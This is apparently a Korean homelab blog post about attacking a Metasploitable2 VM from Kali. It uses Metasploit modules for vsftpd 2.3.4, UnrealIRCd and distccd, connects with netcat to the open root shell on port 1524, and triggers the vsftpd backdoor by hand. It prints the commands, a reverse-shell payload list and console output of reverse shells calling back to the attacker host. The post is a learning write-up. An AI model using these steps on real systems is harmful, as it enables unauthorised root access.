+++
title = "Kali × Metasploitable2 실습 (2)"
date = "2026-08-31T16:00:00.000+09:00"
draft = false
summary = "백도어를 해보자"
tags = [ "Proxmox", "Kali Linux", "Metasploitable2", "네트워크", "홈랩" ]
series = [ "Kali-Metasploit Lab" ]
+++

지난 편에서 Metasploitable2를 nmap으로 스캔해서 25개 포트를 확인했습니다. 이번 편에서는 그중 백도어 및 원격 코드 실행(RCE) 계열 취약점 4개를 직접 뚫어볼 것입니다. 대상은 지난 번에 말했던 것처럼 vsftpd 2.3.4, UnrealIRCd, distccd, 1524번 포트입니다.

## vsftpd 2.3.4 백도어

지난번에 21번 포트 배너로 vsftpd 2.3.4를 확인했고 이 버전은 2011년에 vsftpd 배포 서버 자체가 해킹당해서 백도어 코드가 심긴 채로 퍼진 버전입니다.

Metasploit으로 먼저 관련 모듈을 확인했습니다.

```shell
msf6 > search vsftpd
```

`exploit/unix/ftp/vsftpd_234_backdoor` 모듈이 나와서 RHOST를 Metasploitable2로 설정하고 `use` 커맨드로 실행해봤습니다.

```shell
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > set RHOSTS 192.168.100.100

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.100.100:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.100.100:21 - USER: 331 Please specify the password.
[+] 192.168.100.100:21 - Backdoor service has been spawned, handling...
[+] 192.168.100.100:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.100.10:38865 -> 192.168.100.100:6200) at 2026-08-31 01:49:37 -0400

whoami
root
```

바로 root 쉘이 나왔습니다. 정상 vsftpd 코드는 권한을 낮춰서 클라이언트 요청을 처리하는데 이 백도어는 애초에 정상 설계를 따를 이유가 없는 악성 코드라 그런지 절차 없이 곧장 root 쉘을 열어준 것으로 보입니다.

## UnrealIRCd 백도어

vsftpd와 같은 방식으로 검색했습니다.

```shell
msf6 > search UnrealIRCd
```

`exploit/unix/irc/unreal_ircd_3281_backdoor` 하나가 나와서 vsftpd와 마찬가지로 `use`, `set RHOST`까지 하고 `run`을 쳤더니 에러가 났습니다..

```shell
[-] Exploit failed: A payload has not been selected.
```

이게 뭐지...하고 로그를 읽어보면 payload가 필요하다는거 같습니다. 검색해보니 `show payloads`로 사용 가능한 payload 목록을 볼 수 있다고 하네요.

```shell
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

 꽤 많이 나와서 당황했는데 크게 `bind`와 `reverse`로 나뉘어 있었습니다. 찾아보니 단어 그대로 `bind`는 대상이 포트를 열고 기다리는 방식이고 `reverse`는 대상이 공격자한테 먼저 연결을 거는 방식이라고 합니다. 인바운드는 막혀 있어도 아웃바운드는 덜 막아두는 경우가 많아서 실전에서는 reverse가 더 잘 통한다고 합니다.

제일 기본적인 거 같은 `cmd/unix/reverse`를 페이로드로 잡고 기대를 품고 `run`했는데 또 오류가 나네요,,,,

```shell
[-] 192.168.100.100:6667 - Msf::OptionValidateError One or more options failed to validate: LHOST.
```

이번에도 로그를 보니 LHOST가 필요하다고 합니다. 아무래도 reverse 방식이니 희생자 PC가 나한테 연결요청을 보내려면 내 IP가 필요한 게 당연하네요. `LHOST`도 Kali IP로 설정하고 `run`해서 권한을 얻는데 성공했습니다. 이번에도 사용자 권한은 root였습니다. 

```shell
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[*] Started reverse TCP double handler on 192.168.100.10:4444
[*] 192.168.100.100:6667 - Connected to 192.168.100.100:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] 192.168.100.100:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo N7pWN9OBVICWrQFs;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "N7pWN9OBVICWrQFs\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.100.10:4444 -> 192.168.100.100:53822) at 2026-08-31 01:59:31 -0400

whoami
root
```

문득 왜 vsftpd는 payload 선택이 필요없고 UnrealIRCd는 필요했을까 궁금해서 찾아봤습니다. vsftpd 백도어는 트리거되면 무조건 정해진 동작으로 쉘 하나 열어주기만 하는데 UnrealIRCd 백도어는 트리거되면 공격자가 지정한 임의의 명령어를 실행해주는 방식이라 어떤 명령을 실행시킬지를 골라야 한다고 하고 그게 payload라고 하네요.

## distccd RCE

마찬가지로 search로 모듈 찾고 RHOST, LHOST 지정하고 일단 `run` 해봤는데 뭔가 잘 안 된 거 같았습니다.

```shell
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.100.100
RHOSTS => 192.168.100.100
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.100.10
LHOST => 192.168.100.10
msf6 exploit(unix/misc/distcc_exec) > run
[*] Started reverse TCP handler on 192.168.100.10:4444
[*] 192.168.100.100:3632 - stderr: bash: 117: Bad file descriptor
[*] 192.168.100.100:3632 - stderr: bash: /dev/tcp/192.168.100.10/4444: No such file or directory
[*] 192.168.100.100:3632 - stderr: bash: 117: Bad file descriptor
[*] Exploit completed, but no session was created.
```

익스플로잇은 컴플릿됐는데 쉘이 하나도 안 열렸습니다. 왜 이러지 싶어서 AI한테 물어보고 찾아보니깐 원인을 알 수 있었습니다.

결론적으로 페이로드 문제였는데 `distcc_exec`는 페이로드 기본값으로 `cmd/unix/reverse_bash`를 사용합니다. 근데 `cmd/unix/reverse_bash`는 리버스 쉘을 만들 때 bash의 `/dev/tcp`라는 기능을 사용하는데 `distcc`는 명령을 사용할 때 dash 같은 더 가벼운 쉘로 실행하는게 문제였습니다. dash에는 `/dev/tcp` 기능이 아예 없어서 `No such file or directory` 같은 에러와 함께 종료된 것이었습니다.

그래서 `cmd/unix/reverse`로 페이로드를 변경하니 성공했습니다.

```shell
msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD payload/cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > run
[*] Started reverse TCP double handler on 192.168.100.10:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo v3OHGHir9ZII3dJK;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "v3OHGHir9ZII3dJK\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.100.10:4444 -> 192.168.100.100:50851) at 2026-08-31 02:07:29 -0400

whoami
daemon
```

이번에 얻은 권한은 root가 아니라 daemon이었습니다. distcc는 여러 컴퓨터의 CPU를 나눠 쓰는 분산 컴파일 도구입니다. 그러다보니 이 작업에는 관리자 권한이 필요 없어서 최소 권한 원칙으로 설계했습니다. 그래서 취약점은 있어도 뚫었을 때 root가 아니고 root까지 가려면 별도로 권한 상승이 필요합니다.

## ingreslock (1524번 포트)

이 포트는 이미 열려 있는 루트 쉘이라 익스플로잇이 따로 필요 없습니다. 

```shell
$ nc 192.168.100.100 1524
whoami
root
```

## Metasploit 없이 vsftpd 백도어 수동 재현

Metasploit이 내부적으로 뭘 하는지 확인하려고 손으로 직접 해봤습니다. vsftpd 2.3.4는 USER에 `:)`이 들어가있으면 6200번 포트에 쉘을 열라는 조건문을 하드코딩 해놓은 것입니다. 그래서 아래와 같이 `user:)`로 접속하면 자동으로 백도어가 열립니다.

```shell
$ nc 192.168.100.100 21
220 (vsFTPd 2.3.4)
USER user:)
331 Please specify the password.
PASS aaa
```

```shell
$ nc 192.168.100.100 6200
whoami
root
```

## 정리

| 타깃 | 포트 | 결과 |
| --- | --- | --- |
| vsftpd 2.3.4 | 21 → 6200 | root |
| UnrealIRCd | 6667 | root |
| distccd | 3632 | daemon |
| ingreslock | 1524 | root |

다음 편은 설정 오류로 침투하는 케이스를 다루어 볼 예정입니다. 이번 백도어처럼 코드 자체에 악성 코드가 심긴 게 아니라 정상 소프트웨어가 잘못 설정돼서 뚫리는 경우를 다루어 보겠습니다.
